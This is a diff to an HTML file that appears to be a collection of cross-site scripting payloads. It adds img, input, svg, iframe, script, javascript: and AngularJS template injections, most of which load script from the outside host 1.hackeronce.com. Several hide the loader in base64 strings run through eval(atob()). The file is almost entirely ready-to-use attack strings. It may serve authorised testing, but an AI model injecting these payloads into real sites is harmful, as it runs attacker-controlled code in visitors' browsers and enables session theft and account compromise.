@@ -1,3 +1,4 @@
+<!-- WARNING: This file contains active, executable XSS payloads for testing and reference purposes only. Use with caution. -->
 <noscript><p title =" </noscript> <img src=x onerror=alert(document.domain);//“>
 
 
@@ -34,3 +35,48 @@ Create Element
 javascript:eval('var a=document.createElement(\'script\');a.src=\'//1.hackeronce.com\';document.body.appendChild(a)')
 Plain JS
 document.head.appendChild(Object.assign(document.createElement('script'),{src:'//1.hackeronce.com'}));
+
+<br><br>
+Image tag with onerror
+<br>
+'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">
+<br><br>
+Input tag with autofocus
+<br>
+'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">
+<br><br>
+jQuery getScript
+<br>
+'"><script>$.getScript("https://1.hackeronce.com/shopscript")</script>
+<br><br>
+JavaScript protocol
+<br>
+javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))
+<br><br>
+Iframe
+<br>
+'"><iframe src="https://1.hackeronce.com"></iframe>
+<br><br>
+Base tag (commented out)
+<br>
+<!-- <base href="https://1.hackeronce.com" /> -->
+<br><br>
+Meta-tag refresh (commented out)
+<br>
+<!-- <meta http-equiv="refresh" content="0; url=https://1.hackeronce.com" /> -->
+<br><br>
+AngularJS constructor
+<br>
+{{constructor.constructor("import('https://1.hackeronce.com/shopscript')")()}}
+<br><br>
+Script src
+<br>
+'"><script src="https://1.hackeronce.com"></script>
+<br><br>
+SVG onload with eval(atob())
+<br>
+'"><svg onload="eval(atob(this.id))" id="aW1wb3J0KCcvLzEuaGFja2Vyb25jZS5jb20vcXVhbHRyaWNzJyk=">
+<br><br>
+Image tag HTTP callback
+<br>
+'"><img src="https://1.hackeronce.com/shopimg.png">
